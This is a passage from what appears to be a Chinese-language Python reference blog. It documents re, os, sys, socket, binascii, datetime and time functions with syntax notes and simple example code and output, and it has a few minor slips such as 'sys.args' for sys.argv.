class="hljs-string">&quot;daw3g556aeda68fserfrse5g&quot;</span>expr = re.<span class="hljs-built_in">compile</span>(str1)result = re.findall(expr,str2)<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(result))<span class="hljs-built_in">print</span>(result)--------------output-----------------&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;[<span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>]</code></pre></div><h2 id="re-match"><a href="#re-match" class="headerlink" title="re.match()"></a>re.match()</h2><p><strong>功能</strong>：从字符串的开始位置进行匹配,如果起始位置匹配成功,则返回Match对象,否则返回None</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs pf">re.<span class="hljs-built_in">match</span>(expr,str,[<span class="hljs-keyword">flags</span>])参数：expr:正则表达式str:字符串内容<span class="hljs-keyword">flags</span> : 可选，表示匹配模式，比如忽略大小写，多行模式等</code></pre></div><p><strong>返回值</strong></p><p>匹配成功返回Match对象</p><p>匹配失败返回None</p><p><strong>通过group()可获取匹配的值</strong></p><h3 id="示例-7"><a href="#示例-7" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------words1 = <span class="hljs-string">&quot;a&quot;</span>words2 = <span class="hljs-string">&quot;A&quot;</span>string = <span class="hljs-string">&quot;abcd12345&quot;</span>expr = re.<span class="hljs-built_in">compile</span>(words1)result1 = re.<span class="hljs-keyword">match</span>(expr,words1)result2 = re.<span class="hljs-keyword">match</span>(expr,words2)<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;匹配结果类型&quot;</span>,<span class="hljs-built_in">type</span>(result1))<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;匹配成功结果：&quot;</span>,result1)<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;匹配失败结果：&quot;</span>,result2)--------------output-----------------匹配结果类型 &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;re.Match&#x27;</span>&gt;匹配成功结果： &lt;re.Match <span class="hljs-built_in">object</span>; span=(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>=<span class="hljs-string">&#x27;a&#x27;</span>&gt;匹配失败结果： <span class="hljs-literal">None</span></code></pre></div><h2 id="re-search"><a href="#re-search" class="headerlink" title="re.search()"></a>re.search()</h2><p><strong>功能</strong>：匹配整个字符串，并返回第一个成功的匹配。如果匹配失败，则返回None</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs python">re.search(pattern,string,[flags])参数：pattern:正则表达式string:字符串内容flags : 可选，表示匹配模式，比如忽略大小写，多行模式等</code></pre></div><p><strong>返回值</strong></p><p>匹配成功返回第一个项</p><p>匹配失败返回None</p><h3 id="示例-8"><a href="#示例-8" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------words1 = <span class="hljs-string">&quot;1&quot;</span>words2 = <span class="hljs-string">&quot;A&quot;</span>string = <span class="hljs-string">&quot;abcd12345&quot;</span>expr = re.<span class="hljs-built_in">compile</span>(words1)result1 = re.search(expr,words1)result2 = re.search(expr,words2)<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;匹配结果类型&quot;</span>,<span class="hljs-built_in">type</span>(result1))<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;匹配成功结果：&quot;</span>,result1)<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;匹配失败结果：&quot;</span>,result2)--------------output-----------------匹配结果类型 &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;re.Match&#x27;</span>&gt;匹配成功结果： &lt;re.Match <span class="hljs-built_in">object</span>; span=(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>=<span class="hljs-string">&#x27;1&#x27;</span>&gt;匹配失败结果： <span class="hljs-literal">None</span></code></pre></div><h2 id="re-sub"><a href="#re-sub" class="headerlink" title="re.sub()"></a>re.sub()</h2><p><strong>功能</strong>：匹配字符串内容，将符合匹配模式的内容替换位指定的值</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs applescript">re.sub(pattern, repl, <span class="hljs-built_in">string</span>, <span class="hljs-built_in">count</span>, flags)参数：pattern:正则表达式repl：替换的字符串，也可以是函数或表达式<span class="hljs-built_in">string</span>：字符串内容<span class="hljs-built_in">count</span>：匹配次数，<span class="hljs-number">0</span>表示替换所有的匹配flags</code></pre></div><p><strong>返回值</strong></p><p>返回替换后的字符串内容</p><h3 id="示例-9"><a href="#示例-9" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------pattern = <span class="hljs-string">&quot;[a-z]&quot;</span>string = <span class="hljs-string">&quot;abcd12345&quot;</span>result = re.sub(pattern=pattern,repl=<span class="hljs-string">&quot;A&quot;</span>,string=string,count=<span class="hljs-number">0</span>)<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(result))<span class="hljs-built_in">print</span>(result)--------------output-----------------&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;AAAA12345</code></pre></div><h1 id="os"><a href="#os" class="headerlink" title="os"></a>os</h1><h2 id="os-getcwd"><a href="#os-getcwd" class="headerlink" title="os.getcwd()"></a>os.getcwd()</h2><p>获取当前的工作目录(根目录)</p><h2 id="os-system"><a href="#os-system" class="headerlink" title="os.system()"></a>os.system()</h2><p><strong>功能</strong>：调用系统命令执行</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs livecodeserver">os.<span class="hljs-keyword">system</span>(<span class="hljs-keyword">command</span>)参数：<span class="hljs-keyword">command</span>：系统命令字符串</code></pre></div><p><strong>返回值</strong></p><p>无</p><h3 id="示例-10"><a href="#示例-10" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------os.system(<span class="hljs-string">&quot;calc&quot;</span>)--------------output-----------------弹出计算器</code></pre></div><h2 id="os-mkdir"><a href="#os-mkdir" class="headerlink" title="os.mkdir()"></a>os.mkdir()</h2><p><strong>功能</strong>：创建文件夹，<strong>无法递归创建文件夹</strong>。</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs dos">os.<span class="hljs-built_in">mkdir</span>(<span class="hljs-built_in">path</span>, <span class="hljs-built_in">mode</span>, dir_fd)参数：name：文件夹路径<span class="hljs-built_in">mode</span>：指定权限模式dir_fd：</code></pre></div><p><strong>返回值</strong></p><div class="code-wrapper"><pre><code class="hljs">无</code></pre></div><h3 id="示例-11"><a href="#示例-11" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------os.mkdir(<span class="hljs-string">&quot;D:\\\\tmp1&quot;</span>)os.mkdir(<span class="hljs-string">&quot;D:\\\\tmp&quot;</span>)--------------output-----------------FileExistsError: [WinError <span class="hljs-number">183</span>] 当文件已存在时，无法创建该文件。: <span class="hljs-string">&#x27;D:\\\\tmp&#x27;</span></code></pre></div><h2 id="os-makedirs"><a href="#os-makedirs" class="headerlink" title="os.makedirs()"></a>os.makedirs()</h2><p>功能：创建文件夹，<strong>可递归创建文件夹</strong>。</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs excel">os.makedirs(name, <span class="hljs-built_in">mode</span>, exist_ok)参数：name：文件夹路径<span class="hljs-built_in">mode</span>：指定权限模式exist_ok：默认值为<span class="hljs-built_in">False</span>，即当目标目录已经存在，python抛出OSError。</code></pre></div><p><strong>返回值</strong></p><div class="code-wrapper"><pre><code class="hljs">无</code></pre></div><h3 id="示例-12"><a href="#示例-12" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------os.mkdir(<span class="hljs-string">&quot;D:\\\\tmp\\\\test&quot;</span>)--------------output-----------------</code></pre></div><h1 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h1><h2 id="sys-args"><a href="#sys-args" class="headerlink" title="sys.args"></a>sys.args</h2><p><strong>功能</strong>：获取命令行的参数</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs stylus">sys<span class="hljs-selector-class">.args</span><span class="hljs-selector-attr">[n]</span></code></pre></div><p><strong>参数</strong></p><div class="code-wrapper"><pre><code class="hljs stylus">n：sys<span class="hljs-selector-class">.args</span><span class="hljs-selector-attr">[0]</span>------获取当前脚本的名称sys<span class="hljs-selector-class">.args</span><span class="hljs-selector-attr">[1]</span>------获取第<span class="hljs-number">1</span>个参数值sys<span class="hljs-selector-class">.args</span><span class="hljs-selector-attr">[2]</span>------获取第<span class="hljs-number">2</span>个参数值...sys<span class="hljs-selector-class">.args</span><span class="hljs-selector-attr">[n]</span>------获取第n个参数值</code></pre></div><h1 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h1><h1 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h1><h2 id="sock-socket-socket"><a href="#sock-socket-socket" class="headerlink" title="sock &#x3D; socket.socket()"></a>sock &#x3D; socket.socket()</h2><p><strong>功能</strong>：创建socket对象</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs python">s = socket.socket([family,<span class="hljs-built_in">type</span>,fileno])参数：family: 指定网络协议类型，默认是AF_INET，即IPv4<span class="hljs-built_in">type</span>: 指定类型,默认是SOCK_STREAM，即流格式fileno: 文件描述符fd</code></pre></div><p><strong>返回值</strong></p><p>socket实例对象</p><h3 id="示例-13"><a href="#示例-13" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------<span class="hljs-keyword">import</span> socketsock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(sock))<span class="hljs-built_in">print</span>(sock)--------------output-----------------&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;socket.socket&#x27;</span>&gt;&lt;socket.socket fd=<span class="hljs-number">568</span>, family=AddressFamily.AF_INET, <span class="hljs-built_in">type</span>=SocketKind.SOCK_STREAM, proto=<span class="hljs-number">0</span>&gt;</code></pre></div><h2 id="sock-bind"><a href="#sock-bind" class="headerlink" title="sock.bind()"></a>sock.bind()</h2><p><strong>功能</strong>：将socket对象绑定到指定地址</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs css">sock<span class="hljs-selector-class">.bind</span>(<span class="hljs-selector-tag">address</span>)参数：<span class="hljs-selector-tag">address</span>: 绑定的地址，值为元组类型</code></pre></div><p><strong>返回值</strong></p><p>无</p><h3 id="示例-14"><a href="#示例-14" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------<span class="hljs-keyword">import</span> socketsock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)address = (<span class="hljs-string">&quot;192.168.26.1&quot;</span>,<span class="hljs-number">8888</span>)sock.bind(address)--------------output-----------------</code></pre></div><h2 id="sock-listen"><a href="#sock-listen" class="headerlink" title="sock.listen()"></a>sock.listen()</h2><p><strong>功能</strong>：开启监听</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs mipsasm">sock.listen([<span class="hljs-keyword">backlog])</span><span class="hljs-keyword"></span>参数：<span class="hljs-keyword">backlog: </span>指定最大连接数</code></pre></div><p><strong>返回值</strong></p><p>无</p><h3 id="示例-15"><a href="#示例-15" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------<span class="hljs-keyword">import</span> socketsock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)address = (<span class="hljs-string">&quot;192.168.26.1&quot;</span>,<span class="hljs-number">8888</span>)sock.bind(address)sock.listen(<span class="hljs-number">5</span>)--------------output-----------------</code></pre></div><h2 id="sock-connect"><a href="#sock-connect" class="headerlink" title="sock.connect()"></a>sock.connect()</h2><p><strong>功能</strong>：连接socket服务端</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs css">sock<span class="hljs-selector-class">.connect</span>(<span class="hljs-selector-tag">address</span>)参数：<span class="hljs-selector-tag">address</span>: 服务端地址，值类型为元组</code></pre></div><p><strong>返回值</strong></p><p>成功连接socket返回None</p><h3 id="示例-16"><a href="#示例-16" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------<span class="hljs-keyword">import</span> socketsock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)server_address = (<span class="hljs-string">&quot;192.168.26.1&quot;</span>,<span class="hljs-number">8888</span>)result = sock.connect(server_address)<span class="hljs-keyword">if</span> result == <span class="hljs-literal">None</span>:    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;success connect server, &quot;</span>,server_address)--------------output-----------------&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;NoneType&#x27;</span>&gt;<span class="hljs-literal">None</span>success connect server,  (<span class="hljs-string">&#x27;192.168.26.1&#x27;</span>, <span class="hljs-number">8888</span>)</code></pre></div><h2 id="sock-accept"><a href="#sock-accept" class="headerlink" title="sock.accept()"></a>sock.accept()</h2><p><strong>功能</strong>：接收客户端的连接请求</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs stylus">socket,<span class="hljs-selector-tag">address</span> = sock<span class="hljs-selector-class">.accept</span>()参数：无</code></pre></div><p><strong>返回值</strong></p><p>socket: 客户端的socket对象</p><p>address: 客户端的地址</p><h3 id="示例-17"><a href="#示例-17" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------client_sock,client_address = sock.accept() <span class="hljs-comment">#当接收到客户端的请求后才会执行下面的代码</span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(client_sock))<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(client_address))<span class="hljs-built_in">print</span>(client_sock)<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;got a new connection, &quot;</span>,client_address)--------------output-----------------server start listening...&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;socket.socket&#x27;</span>&gt;&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;&lt;socket.socket fd=<span class="hljs-number">740</span>, family=AddressFamily.AF_INET, <span class="hljs-built_in">type</span>=SocketKind.SOCK_STREAM, proto=<span class="hljs-number">0</span>, laddr=(<span class="hljs-string">&#x27;192.168.26.1&#x27;</span>, <span class="hljs-number">8888</span>), raddr=(<span class="hljs-string">&#x27;192.168.26.1&#x27;</span>, <span class="hljs-number">38957</span>)&gt;got a new connection,  (<span class="hljs-string">&#x27;192.168.26.1&#x27;</span>, <span class="hljs-number">38957</span>)</code></pre></div><h2 id="sock-send"><a href="#sock-send" class="headerlink" title="sock.send()"></a>sock.send()</h2><p><strong>功能</strong>：发送指定的数据。它接受一个字节串（bytes）作为参数，并返回成功发送的字节数</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs haskell"><span class="hljs-title">sock</span>.send(<span class="hljs-class"><span class="hljs-keyword">data</span>)</span>参数：<span class="hljs-class"><span class="hljs-keyword">data</span>: 字节(<span class="hljs-title">byte</span>)类型数据</span></code></pre></div><p><strong>返回值</strong></p><p>返回整形数据，表示成功发送了的数据数量</p><h3 id="示例-18"><a href="#示例-18" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------msg = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;say$ &quot;</span>)n = sock.send(msg.encode(<span class="hljs-string">&quot;utf8&quot;</span>))<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(n))<span class="hljs-built_in">print</span>(n)--------------output-----------------say$ hhhhheeeeelo&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;<span class="hljs-number">12</span></code></pre></div><h2 id="sock-sendall"><a href="#sock-sendall" class="headerlink" title="sock.sendall()"></a>sock.sendall()</h2><p><strong>功能</strong>：<code>socket.sendall(data)</code> 方法也用于发送数据，但与 <code>socket.send(data)</code> 方法不同的是，它会一直发送数据直到全部发送完毕，或者出现错误。如果成功发送了全部数据，则返回None。如果发生错误，则可能会抛出异常。</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs haskell"><span class="hljs-title">sock</span>.sendall(<span class="hljs-class"><span class="hljs-keyword">data</span>)</span>参数：<span class="hljs-class"><span class="hljs-keyword">data</span>: 字节(<span class="hljs-title">byte</span>)类型数据</span></code></pre></div><p><strong>返回值</strong></p><p>成功发送全部数据后返回None</p><h3 id="示例-19"><a href="#示例-19" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------msg = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;say$ &quot;</span>)n = sock.sendall(msg.encode(<span class="hljs-string">&quot;utf8&quot;</span>))<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(n))<span class="hljs-built_in">print</span>(n)--------------output-----------------say$ heloooa&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;NoneType&#x27;</span>&gt;<span class="hljs-literal">None</span></code></pre></div><h2 id="sock-recv"><a href="#sock-recv" class="headerlink" title="sock.recv()"></a>sock.recv()</h2><p><strong>功能</strong>：用于接收socket.send发送的数据</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs mipsasm">sock.recv(<span class="hljs-keyword">bufsize)</span><span class="hljs-keyword"></span>参数：<span class="hljs-keyword">bufsize: </span>接收数据的窗口大小</code></pre></div><p><strong>返回值</strong></p><p>字节类型数据</p><p><strong>备注</strong>：当接收的数据大于1024时，可通过循环方式拼接数据来获取所有数据</p><h3 id="示例-20"><a href="#示例-20" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------msg = client_sock.recv(<span class="hljs-number">1024</span>)<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(msg))<span class="hljs-built_in">print</span>(msg)<span class="hljs-built_in">print</span>(msg.decode())--------------output-----------------&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytes&#x27;</span>&gt;<span class="hljs-string">b&#x27;hello&#x27;</span>hello</code></pre></div><h2 id="sock-close"><a href="#sock-close" class="headerlink" title="sock.close()"></a>sock.close()</h2><p><strong>功能</strong>：</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs cos">sock.<span class="hljs-keyword">close</span>()参数：无</code></pre></div><p><strong>返回值</strong></p><p>成功关闭后返回None</p><h3 id="示例-21"><a href="#示例-21" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------<span class="hljs-keyword">import</span> socketsock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)server_address = (<span class="hljs-string">&quot;192.168.26.1&quot;</span>,<span class="hljs-number">8888</span>)sock.connect(server_address)result = sock.close()<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(result))<span class="hljs-built_in">print</span>(result)--------------output-----------------&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;NoneType&#x27;</span>&gt;<span class="hljs-literal">None</span></code></pre></div><h1 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h1><h1 id="binascii"><a href="#binascii" class="headerlink" title="binascii"></a>binascii</h1><h2 id="binascii-a2b-base64"><a href="#binascii-a2b-base64" class="headerlink" title="binascii.a2b_base64()"></a>binascii.a2b_base64()</h2><p><strong>功能</strong>：将base64编码数据解码</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs haskell"><span class="hljs-title">binascii</span>.a2b_base64(<span class="hljs-class"><span class="hljs-keyword">data</span>)</span>参数：<span class="hljs-class"><span class="hljs-keyword">data</span>: base64编码数据</span></code></pre></div><p><strong>返回值</strong></p><p>字节类型的字符串</p><h3 id="示例-22"><a href="#示例-22" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------<span class="hljs-keyword">import</span> binascii<span class="hljs-comment"># base64 编码字符串</span>base64_string = <span class="hljs-string">&quot;SGVsbG8sIFdvcmxkIQ==&quot;</span><span class="hljs-comment"># 解码 base64 字符串</span>result = binascii.a2b_base64(base64_string)<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(result))<span class="hljs-comment"># 打印解码后的数据</span><span class="hljs-built_in">print</span>(result)<span class="hljs-built_in">print</span>(result.decode())--------------output-----------------&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytes&#x27;</span>&gt;<span class="hljs-string">b&#x27;\\x9d\\xebp\\xa2\\xb9\\x1a&#x27;</span></code></pre></div><h2 id="binascii-b2a-base64"><a href="#binascii-b2a-base64" class="headerlink" title="binascii.b2a_base64()"></a>binascii.b2a_base64()</h2><p><strong>功能</strong>：将字符串进行base64编码</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs haskell"><span class="hljs-title">binascii</span>.b2a_base64(<span class="hljs-class"><span class="hljs-keyword">data</span>)</span>参数：<span class="hljs-class"><span class="hljs-keyword">data</span>: 字节类型的字符串</span></code></pre></div><p><strong>返回值</strong></p><p>字节类型的base64编码数据</p><h3 id="示例-23"><a href="#示例-23" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------<span class="hljs-keyword">import</span> binascii<span class="hljs-comment"># 字符串</span>byte_string = <span class="hljs-string">b&quot;hello,world&quot;</span><span class="hljs-comment"># 字符串 base64编码</span>result = binascii.b2a_base64(byte_string)<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(result))<span class="hljs-comment"># 打印编码后的数据</span><span class="hljs-built_in">print</span>(result)<span class="hljs-built_in">print</span>(result.decode())--------------output-----------------&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytes&#x27;</span>&gt;<span class="hljs-string">b&#x27;aGVsbG8sd29ybGQ=\\n&#x27;</span>aGVsbG8sd29ybGQ=</code></pre></div><h2 id="binascii-a2b-hex"><a href="#binascii-a2b-hex" class="headerlink" title="binascii.a2b_hex()"></a>binascii.a2b_hex()</h2><p><strong>功能</strong>：将十六进制数据解码为字符串</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs haskell"><span class="hljs-title">binascii</span>.a2b_hex(<span class="hljs-class"><span class="hljs-keyword">data</span>)</span>参数：<span class="hljs-class"><span class="hljs-keyword">data</span>: 十六进制数据</span></code></pre></div><p><strong>返回值</strong></p><p>字节类型的字符串数据</p><h3 id="示例-24"><a href="#示例-24" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------<span class="hljs-keyword">import</span> binascii<span class="hljs-comment"># 十六进制字符串</span>hex_string = <span class="hljs-string">&quot;48656c6c6f2c20576f726c6421&quot;</span><span class="hljs-comment"># 将十六进制字符串转换为字节串</span>result = binascii.a2b_hex(hex_string)<span class="hljs-comment"># 打印转换后的字节串</span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(result))<span class="hljs-built_in">print</span>(result)<span class="hljs-built_in">print</span>(result.decode())--------------output-----------------&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytes&#x27;</span>&gt;<span class="hljs-string">b&#x27;Hello, World!&#x27;</span>Hello, World!</code></pre></div><h2 id="binascii-b2a-hex"><a href="#binascii-b2a-hex" class="headerlink" title="binascii.b2a_hex()"></a>binascii.b2a_hex()</h2><p><strong>功能</strong>：将字符串转换成十六进制</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs haskell"><span class="hljs-title">binascii</span>.b2a_hex(<span class="hljs-class"><span class="hljs-keyword">data</span>)</span>参数：<span class="hljs-class"><span class="hljs-keyword">data</span>: 字节类型的字符串</span></code></pre></div><p><strong>返回值</strong></p><p>字节类型的十六进制数据</p><h3 id="示例-25"><a href="#示例-25" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------<span class="hljs-keyword">import</span> binasciistring = <span class="hljs-string">&quot;hello,word&quot;</span>result = binascii.b2a_hex(string.encode())<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(result))<span class="hljs-built_in">print</span>(result)<span class="hljs-built_in">print</span>(result.decode())--------------output-----------------&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytes&#x27;</span>&gt;<span class="hljs-string">b&#x27;68656c6c6f2c776f7264&#x27;</span>68656c6c6f2c776f7264</code></pre></div><h1 id="datetime"><a href="#datetime" class="headerlink" title="datetime"></a>datetime</h1><h2 id="now-datetime-now"><a href="#now-datetime-now" class="headerlink" title="now&#x3D;datetime.now()"></a>now&#x3D;datetime.now()</h2><p><strong>功能</strong>：获取现在的时间</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs arcade">datetime.<span class="hljs-built_in">now</span>()参数：无</code></pre></div><p><strong>返回值</strong></p><p>datetime类型的时间</p><h3 id="示例-26"><a href="#示例-26" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetimenow = datetime.now()<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(now))<span class="hljs-built_in">print</span>(now)--------------output-----------------&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;datetime.datetime&#x27;</span>&gt;<span class="hljs-number">2023</span>-07-08 <span class="hljs-number">23</span>:09:<span class="hljs-number">59.993014</span></code></pre></div><h2 id="now-strftime"><a href="#now-strftime" class="headerlink" title="now.strftime()"></a>now.strftime()</h2><p><strong>功能</strong>：格式化时间</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs sas">now.strf<span class="hljs-meta">time</span>(<span class="hljs-keyword">format</span>)参数：<span class="hljs-keyword">format</span>: 时间的格式，如<span class="hljs-title function_">%Y</span>-<span class="hljs-title function_">%m</span>-<span class="hljs-title function_">%d</span> <span class="hljs-title function_">%H</span>:<span class="hljs-title function_">%M</span>:<span class="hljs-title function_">%S</span><span class="hljs-string">&quot;</span></code></pre></div><p><strong>返回值</strong></p><p>字符串格式的时间</p><h3 id="示例-27"><a href="#示例-27" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetimenow = datetime.now()formatted = now.strftime(<span class="hljs-string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)  <span class="hljs-comment"># 格式化为字符串</span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(formatted))<span class="hljs-built_in">print</span>(formatted)--------------output-----------------&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<span class="hljs-number">2023</span>-07-08 <span class="hljs-number">23</span>:<span class="hljs-number">12</span>:<span class="hljs-number">24</span></code></pre></div><h1 id="time"><a href="#time" class="headerlink" title="time"></a>time</h1><h2 id="time-time"><a href="#time-time" class="headerlink" title="time.time()"></a>time.time()</h2><p><strong>功能</strong>：获取当前时间戳</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs applescript"><span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()参数：无</code></pre></div><p><strong>返回值</strong></p><p>浮点数类型数据</p><h3 id="示例-28"><a href="#示例-28" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------<span class="hljs-keyword">import</span> timeresult = time.time()<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(result))<span class="hljs-built_in">print</span>(result)--------------output-----------------&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;float&#x27;</span>&gt;<span class="hljs-number">1688828652.3362973</span></code></pre></div><h2 id="time-sleep"><a href="#time-sleep" class="headerlink" title="time.sleep()"></a>time.sleep()</h2><p><strong>功能</strong>：休眠指定时间</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">time</span>.sleep(<span class="hljs-built_in">seconds</span>)参数：<span class="hljs-built_in">seconds</span>：秒数</code></pre></div><p><strong>返回值</strong></p><p>无</p><h3 id="示例-29"><a href="#示例-29" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------time.sleep(<span class="hljs-number">3</span>)--------------output-----------------等待<span class="hljs-number">3</span>秒后结束</code></pre></div><h1 id="threading"><a href="#threading" class="headerlink" title="threading"></a>threading</h1><p>功能：多线程执行任务</p><h2 id="单线程"><a href="#单线程" class="headerlink" title="单线程"></a>单线程</h2><h3 id="创建线程对象"><a href="#创建线程对象" class="headerlink" title="创建线程对象"></a>创建线程对象</h3><p>t &#x3D; threading.Thread()</p><div class="code-wrapper"><pre><code class="hljs avrasm">语法：t = threading.Thread(target,(args|kwargs))参数：<span class="hljs-symbol">target:</span>需要运行的目标方法<span class="hljs-symbol">name:</span>线程的名字<span class="hljs-symbol">args:</span>使用元组方式向目标方法传递参数，单个参数表示，(param1,)，多个参数表示，(param1,param2,param3)<span class="hljs-symbol">kwargs:</span>使用字典的方式向目标方法传递参数，示例 &#123;<span class="hljs-string">&quot;key1&quot;</span>: <span class="hljs-string">&quot;value1&quot;</span>,<span class="hljs-string">&quot;key2&quot;</span>: <span 